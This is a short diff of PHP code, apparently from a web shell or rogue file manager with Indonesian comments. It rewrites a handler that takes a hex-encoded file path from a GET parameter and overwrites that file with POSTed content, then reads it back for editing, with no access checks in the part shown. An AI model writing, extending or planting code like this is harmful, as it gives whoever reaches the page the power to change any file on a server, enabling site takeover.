@@ -212,10 +212,22 @@ echo "</tbody></table></div></div></div>";
             $file = unhex($_GET['edit']);
             if (is_file($file)) {
                 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['content'])) {
-                    file_put_contents($file, $_POST['content']);
-                    echo "<script>alert('File berhasil disimpan.'); window.location='?path=" . hex($path) . "';</script>";
+                    // Membuka file untuk ditulis
+                    $handle = fopen($file, 'w');
+                    if ($handle) {
+                        // Menulis konten yang baru ke file
+                        fwrite($handle, $_POST['content']);
+                        fclose($handle); // Menutup file setelah menulis
+        
+                        echo "<script>alert('File berhasil disimpan.'); window.location='?path=" . hex($path) . "';</script>";
+                    } else {
+                        echo "<script>alert('Gagal membuka file untuk ditulis.');</script>";
+                    }
                 }
+        
+                // Membaca konten file untuk ditampilkan di form edit
                 $content = file_get_contents($file);
+        
                 echo "<div class='mt-4'>
                         <h3>Edit File: " . basename($file) . "</h3>
                         <form method='post'>
